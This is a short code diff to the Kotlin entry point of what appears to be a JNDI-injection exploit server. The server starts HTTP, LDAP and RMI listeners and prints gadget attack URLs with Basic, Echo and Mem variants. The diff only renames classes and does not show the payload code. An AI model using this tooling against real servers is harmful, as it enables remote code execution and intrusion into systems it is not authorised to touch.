@@ -1,23 +1,22 @@
 import http.HTTPServer
 import ldap.LDAPServer
 import rmi.RMIServer
-import util.Options
+import util.Option
 import util.green
-import util.purple
 import kotlin.concurrent.thread
 import kotlin.system.exitProcess
 
 fun main(args: Array<String>) {
-    Options.init(args)
+    Option.init(args)
 
-    with(Options) {
+    with(Option) {
         if (helpInfo) {
             println("Try the following links ;)".green())
-            Class.forName("rmi.PayloadsKt").declaredMethods
+            Class.forName("rmi.gadgets").declaredMethods
                 .map { if (it.name != "groovy") "${it.name}/[Basic|Echo|Mem]" else it.name }
                 .forEach { println("rmi://$address:$rmiPort/$it") }
 
-            Class.forName("ldap.PayloadsKt").declaredMethods
+            Class.forName("ldap.gadgets").declaredMethods
                 .map { if (it.name != "groovy") "${it.name}/[Basic|Echo|Mem]" else it.name }
                 .forEach { println("ldap://$address:$ldapPort/$it") }
 
